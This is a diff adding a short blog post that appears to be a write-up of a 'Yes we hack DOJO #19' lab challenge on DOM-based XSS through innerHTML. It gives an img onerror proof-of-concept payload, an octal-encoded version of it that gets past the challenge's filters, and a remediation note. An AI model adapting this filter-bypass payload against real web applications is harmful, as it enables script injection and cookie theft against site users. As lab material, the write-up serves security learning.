@@ -1,0 +1,38 @@
+---
+layout: post
+title:  "Yes we hack DOJO #19"
+date:   2022-12-07 10:02:59 +0100
+hidden: true
+categories: jekyll update
+---
+
+## Description
+DOM XSS in
+```javascript
+var cmd = '$cmd';
+[...]
+var command = user[cmd] || 'Command \''+cmd+'\' not found.';//(2)
+[...]
+document.getElementById('inpt').innerHTML = cmd+'<br>'+command;
+```
+## Exploitation
+Step 1. Pass the filters: Using octal was fine.
+Step 2. Get execution. Regular script arent reloaded by browser but stuff like onload and onerror is fine.
+
+## PoC
+```html
+<img src=1 onerror="users['butters'].connection='offline';console.log('h4x');"> 
+```
+=> in octal
+```
+\12\74\151\155\147\40\163\162\143\75\61\40\157\156\145\162\162\157\162\75\42\165\163\145\162\163\133\47\142\165\164\164\145\162\163\47\135\56\143\157\156\156\145\143\164\151\157\156\75\47\157\146\146\154\151\156\145\47\73\143\157\156\163\157\154\145\56\154\157\147\50\47\150\64\170\47\51\73\42\76\12
+```
+## Risk
+Cookie leaks, Redirects and other dangerous stuff.
+
+## Remediation
+Don't use innerHTML, use something more appropriate like textContext.
+
+## Bugs
+
+Only works in Firefox for me, not in chrome. DOMContentloaded fires too early in chrome, ofcourse I can make it fire again but it seems like since butters is grounded it doesn't help if he's late.
